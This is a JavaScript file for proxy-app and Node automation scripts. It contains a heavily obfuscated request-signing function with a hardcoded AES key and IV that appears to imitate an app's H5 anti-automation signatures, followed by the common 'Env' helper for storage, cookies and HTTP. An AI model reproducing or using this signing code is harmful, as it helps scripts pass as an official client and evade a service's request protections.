var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb227b=["\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","\x39\x38\x63\x31\x34\x63\x39\x39\x37\x66\x64\x65\x35\x30\x63\x63\x31\x38\x62\x64\x65\x66\x65\x63\x66\x64\x34\x38\x63\x65\x62\x37","\x70\x61\x72\x73\x65","\x55\x74\x66\x38","\x65\x6E\x63","\x65\x61\x36\x35\x33\x66\x34\x66\x33\x63\x35\x65\x64\x61\x31\x32","\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74","\x43\x42\x43","\x6D\x6F\x64\x65","\x50\x6B\x63\x73\x37","\x70\x61\x64","\x65\x6E\x63\x72\x79\x70\x74","\x41\x45\x53","\x48\x65\x78","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x42\x61\x73\x65\x36\x34","\x64\x65\x63\x72\x79\x70\x74","\x6C\x65\x6E\x67\x74\x68","\x6D\x61\x70","\x73\x6F\x72\x74","\x6B\x65\x79\x73","\x67\x69\x66\x74","\x70\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x26","\x6A\x6F\x69\x6E","\x3D","\x3F","\x69\x6E\x64\x65\x78\x4F\x66","\x63\x6F\x6D\x6D\x6F\x6E\x2F","\x72\x65\x70\x6C\x61\x63\x65","\x68\x65\x61\x64\x65\x72","\x75\x72\x6C","\x72\x65\x71\x53\x6F\x75\x72\x63\x65\x3D\x68\x35","\x61\x73\x73\x69\x67\x6E","\x6D\x65\x74\x68\x6F\x64","\x47\x45\x54","\x64\x61\x74\x61","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x6B\x65\x79\x43\x6F\x64\x65","\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","","\x67\x65\x74","\x70\x6F\x73\x74","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x5F","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taroRequest(_0x1226x2){const _0x1226x3=$[__Oxb227b[0x0]]()?require(__Oxb227b[0x1]):CryptoJS;const _0x1226x4=__Oxb227b[0x2];const _0x1226x5=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x4);const _0x1226x6=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](__Oxb227b[0x6]);let _0x1226x7={"\x41\x65\x73\x45\x6E\x63\x72\x79\x70\x74":function _0x1226x8(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0xc]](_0x1226x9,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]})[__Oxb227b[0x7]].toString()},"\x41\x65\x73\x44\x65\x63\x72\x79\x70\x74":function _0x1226xa(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0xe]][__Oxb227b[0x3]](_0x1226x2),_0x1226xb=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0x11]](_0x1226xb,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]}).toString(_0x1226x3[__Oxb227b[0x5]].Utf8).toString()},"\x42\x61\x73\x65\x36\x34\x45\x6E\x63\x6F\x64\x65":function _0x1226xc(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9)},"\x42\x61\x73\x65\x36\x34\x44\x65\x63\x6F\x64\x65":function _0x1226xd(_0x1226x2){return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0x3]](_0x1226x2).toString(_0x1226x3[__Oxb227b[0x5]].Utf8)},"\x4D\x64\x35\x65\x6E\x63\x6F\x64\x65":function _0x1226xe(_0x1226x2){return _0x1226x3.MD5(_0x1226x2).toString()},"\x6B\x65\x79\x43\x6F\x64\x65":__Oxb227b[0x2]};const _0x1226xf=function _0x1226x10(_0x1226x2,_0x1226x9){if(_0x1226x2 instanceof  Array){_0x1226x9= _0x1226x9|| [];for(var _0x1226xb=0;_0x1226xb< _0x1226x2[__Oxb227b[0x12]];_0x1226xb++){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])}}else {!(_0x1226x2 instanceof  Array)&& _0x1226x2 instanceof  Object?(_0x1226x9= _0x1226x9|| {},Object[__Oxb227b[0x15]](_0x1226x2)[__Oxb227b[0x14]]()[__Oxb227b[0x13]](function(_0x1226xb){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])})):_0x1226x9= _0x1226x2};return _0x1226x9};const _0x1226x11=function _0x1226x12(_0x1226x2){for(var _0x1226x9=[__Oxb227b[0x16],__Oxb227b[0x17]],_0x1226xb=!1,_0x1226x3=0;_0x1226x3< _0x1226x9[__Oxb227b[0x12]];_0x1226x3++){var _0x1226x4=_0x1226x9[_0x1226x3];_0x1226x2[__Oxb227b[0x18]](_0x1226x4)&&  !_0x1226xb&& (_0x1226xb=  !0)};return _0x1226xb};const _0x1226x13=function _0x1226x14(_0x1226x2,_0x1226x9){if(_0x1226x9&& Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x12]]> 0){var _0x1226xb=Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x13]](function(_0x1226x2){return _0x1226x2+ __Oxb227b[0x1b]+ _0x1226x9[_0x1226x2]})[__Oxb227b[0x1a]](__Oxb227b[0x19]);return _0x1226x2[__Oxb227b[0x1d]](__Oxb227b[0x1c])>= 0?_0x1226x2+ __Oxb227b[0x19]+ _0x1226xb:_0x1226x2+ __Oxb227b[0x1c]+ _0x1226xb};return _0x1226x2};const _0x1226x15=function _0x1226x16(_0x1226x2){for(var _0x1226x9=_0x1226x6,_0x1226xb=0;_0x1226xb< _0x1226x9[__Oxb227b[0x12]];_0x1226xb++){var _0x1226x3=_0x1226x9[_0x1226xb];_0x1226x2[__Oxb227b[0x18]](_0x1226x3)&&  !_0x1226x2[__Oxb227b[0x18]](__Oxb227b[0x1e]+ _0x1226x3)&& (_0x1226x2= _0x1226x2[__Oxb227b[0x1f]](_0x1226x3,__Oxb227b[0x1e]+ _0x1226x3))};return _0x1226x2};var _0x1226x9=_0x1226x2,_0x1226xb=(_0x1226x9[__Oxb227b[0x20]],_0x1226x9[__Oxb227b[0x21]]);_0x1226xb+= (_0x1226xb[__Oxb227b[0x1d]](__Oxb227b[0x1c])>  -1?__Oxb227b[0x19]:__Oxb227b[0x1c])+ __Oxb227b[0x22];var _0x1226x17=function _0x1226x18(_0x1226x2){var _0x1226x9=_0x1226x2[__Oxb227b[0x21]],_0x1226xb=_0x1226x2[__Oxb227b[0x24]],_0x1226x3=void(0)=== _0x1226xb?__Oxb227b[0x25]:_0x1226xb,_0x1226x4=_0x1226x2[__Oxb227b[0x26]],_0x1226x6=_0x1226x2[__Oxb227b[0x20]],_0x1226x19=void(0)=== _0x1226x6?{}:_0x1226x6,_0x1226x1a=_0x1226x3[__Oxb227b[0x27]](),_0x1226x1b=_0x1226x7[__Oxb227b[0x28]],_0x1226x1c=_0x1226x19[__Oxb227b[0x29]]|| _0x1226x19[__Oxb227b[0x2a]]|| __Oxb227b[0x2b],_0x1226x1d=__Oxb227b[0x2b],_0x1226x1e=+ new Date();return _0x1226x1d= __Oxb227b[0x2c]!== _0x1226x1a&& (__Oxb227b[0x2d]!== _0x1226x1a|| __Oxb227b[0x2e]!== _0x1226x1c[__Oxb227b[0x27]]()&& _0x1226x4&& Object[__Oxb227b[0x15]](_0x1226x4)[__Oxb227b[0x12]])?_0x1226x7.Md5encode(_0x1226x7.Base64Encode(_0x1226x7.AesEncrypt(__Oxb227b[0x2b]+ JSON[__Oxb227b[0xf]](_0x1226xf(_0x1226x4))))+ __Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e):_0x1226x7.Md5encode(__Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e),_0x1226x11(_0x1226x9)&& (_0x1226x9= _0x1226x13(_0x1226x9,{"\x6C\x6B\x73":_0x1226x1d,"\x6C\x6B\x74":_0x1226x1e}),_0x1226x9= _0x1226x15(_0x1226x9)),Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226x9})}(_0x1226x2= Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226xb}));return _0x1226x17}(function(_0x1226x1f,_0x1226xf,_0x1226x20,_0x1226x21,_0x1226x1c,_0x1226x22){_0x1226x22= __Oxb227b[0x30];_0x1226x21= function(_0x1226x19){if( typeof alert!== _0x1226x22){alert(_0x1226x19)};if( typeof console!== _0x1226x22){console[__Oxb227b[0x31]](_0x1226x19)}};_0x1226x20= function(_0x1226x3,_0x1226x1f){return _0x1226x3+ _0x1226x1f};_0x1226x1c= _0x1226x20(__Oxb227b[0x32],_0x1226x20(_0x1226x20(__Oxb227b[0x33],__Oxb227b[0x34]),__Oxb227b[0x35]));try{_0x1226x1f= __encode;if(!( typeof _0x1226x1f!== _0x1226x22&& _0x1226x1f=== _0x1226x20(__Oxb227b[0x36],__Oxb227b[0x37]))){_0x1226x21(_0x1226x1c)}}catch(e){_0x1226x21(_0x1226x1c)}})({})
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
